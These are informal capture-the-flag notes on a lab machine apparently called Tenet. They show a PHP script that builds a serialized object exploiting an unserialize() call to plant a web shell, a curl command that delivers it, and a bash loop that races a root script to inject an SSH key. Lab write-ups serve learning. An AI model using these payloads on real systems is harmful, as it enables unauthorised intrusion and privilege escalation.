there was a apache page with directory wordpress

now on tenet.htb there was comment suggesting to move sator.php to ==backup so the file will be sator.php.bak==

on getting it it said

```
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

so we gotta make arequest to arepo and ==desetilaize== it

```
<?php

class DatabaseExport {

    public $user_file = "0xdf.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';

}

$sploit = new DatabaseExport;
echo serialize($sploit);
?>
```

and on running it it gives us the payload

now we urlencode it and send it to arepo

`curl -G http://10.10.10.223/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"0xdf.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'`

we tried using -X GET but it didnot work so ==we used -G==

it will give us shell

now for root part

a script was updating id-rsa on root via tmp-ranodmdsds file so we chnaged all tmp-* file in a loop with our id_rsa and got shell

`while true; do for fn in /tmp/ssh*; do echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > $fn; done; done`

`and also ran sudo py file in 2 tab in loopÂ `
